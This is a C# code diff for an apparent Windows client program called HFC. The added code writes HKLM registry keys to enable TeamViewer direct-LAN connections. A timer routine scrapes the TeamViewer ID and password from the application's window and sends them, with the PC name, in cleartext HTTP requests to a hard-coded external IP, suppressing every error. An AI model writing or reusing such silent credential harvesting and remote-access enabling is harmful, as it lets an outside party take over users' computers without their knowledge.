@@ -8,6 +8,7 @@ using System.Threading;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Net;
+using Microsoft.Win32;
 
 namespace HFC
 {
@@ -233,6 +234,36 @@ namespace HFC
                         p.WaitForInputIdle();
                     }
                 }
+                // ghi regedit cho phep het noi qua mang LAN
+                RegistryKey rekey64 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\TeamViewer\\Version7");
+                RegistryKey writekey64 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\TeamViewer\\Version7");
+                if (rekey64 != null)
+                {
+                    writekey64.SetValue("General_DirectLAN", 1, RegistryValueKind.DWord);                   
+                }
+                else
+                {
+                     Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\TeamViewer");
+                     Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\TeamViewer\\Version7");
+                     writekey64 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\TeamViewer\\Version7");
+                     writekey64.SetValue("General_DirectLAN", 1, RegistryValueKind.DWord); 
+                }
+                
+                // ghi ban 32b
+                RegistryKey rekey32 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer\\Version7");
+                RegistryKey writekey32 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\TeamViewer\\Version7");
+                if (rekey32 != null)
+                {
+                    writekey32.SetValue("General_DirectLAN", 1, RegistryValueKind.DWord);
+                }
+                else
+                {
+                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\TeamViewer");
+                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\TeamViewer\\Version7");
+                    writekey32 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\TeamViewer\\Version7");
+                    writekey32.SetValue("General_DirectLAN", 1, RegistryValueKind.DWord);
+                }
+
 
                 if (System.IO.File.Exists(Application.StartupPath + @"\Team\TeamViewer.exe"))
                 {
@@ -383,50 +414,54 @@ namespace HFC
         string currentID="";
         private void timerTeamview_Tick(object sender, EventArgs e)
         {
-            string id = "";
-            string pass = "";
-            hwnd = 0;
-            hwndChild = IntPtr.Zero;
-            hwnd = FindWindow(null, "TeamViewer");
-            if (hwnd > 0)
+            try
             {
-                hwndChild = FindWindowEx((IntPtr)hwnd, IntPtr.Zero, "#32770", null);
-                if (hwndChild != IntPtr.Zero)
+                string id = "";
+                string pass = "";
+                hwnd = 0;
+                hwndChild = IntPtr.Zero;
+                hwnd = FindWindow(null, "TeamViewer");
+                if (hwnd > 0)
                 {
-                    IntPtr hwndChild1 = FindWindowEx((IntPtr)hwndChild, IntPtr.Zero, "Edit", null);
-                    id = GetTextBoxText(hwndChild1).Trim();
-                    IntPtr hwndChild2 = FindWindowEx((IntPtr)hwndChild, hwndChild1, "Edit", null);
-                    pass = GetTextBoxText(hwndChild2).Trim();
-                    string pcName = System.Environment.MachineName;
-                    if (id != "" && pass != "" && id != "-" && pass != "-")
+                    hwndChild = FindWindowEx((IntPtr)hwnd, IntPtr.Zero, "#32770", null);
+                    if (hwndChild != IntPtr.Zero)
                     {
-                        currentID = id;
+                        IntPtr hwndChild1 = FindWindowEx((IntPtr)hwndChild, IntPtr.Zero, "Edit", null);
+                        id = GetTextBoxText(hwndChild1).Trim();
+                        IntPtr hwndChild2 = FindWindowEx((IntPtr)hwndChild, hwndChild1, "Edit", null);
+                        pass = GetTextBoxText(hwndChild2).Trim();
+                        string pcName = System.Environment.MachineName;
+                        if (id != "" && pass != "" && id != "-" && pass != "-")
+                        {
+                            currentID = id;
+                            WebClient client = new WebClient();
+                            try
+                            {
+                                timerTeamview.Interval = 12000;// 300000;
+                                client.Headers.Add("Cache-Control", "no-cache");
+                                client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=add&id=" + id + "&pass=" + pass + "&user=HFC&pc=" + pcName + "&location=HFC Client");
+                            }
+                            catch { }
+                        }
+                    }
+
+                    //thêm thông số teamveiw
+                }
+                else
+                {
+                    if (currentID != "")
+                    {
                         WebClient client = new WebClient();
                         try
                         {
-                            timerTeamview.Interval = 12000;// 300000;
                             client.Headers.Add("Cache-Control", "no-cache");
-                            client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=add&id=" + id + "&pass=" + pass + "&user=HFC&pc=" + pcName + "&location=HFC Client");
+                            client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=del&id=" + currentID + "&pass=&user=&pc=");
                         }
                         catch { }
                     }
                 }
-
-                //thêm thông số teamveiw
             }
-            else
-            {
-                if (currentID != "")
-                {
-                    WebClient client = new WebClient();
-                    try
-                    {
-                        client.Headers.Add("Cache-Control", "no-cache");
-                        client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=del&id=" + currentID + "&pass=&user=&pc=");
-                    }
-                    catch { }
-                }
-            }        
+            catch { }
    
         }        
     }
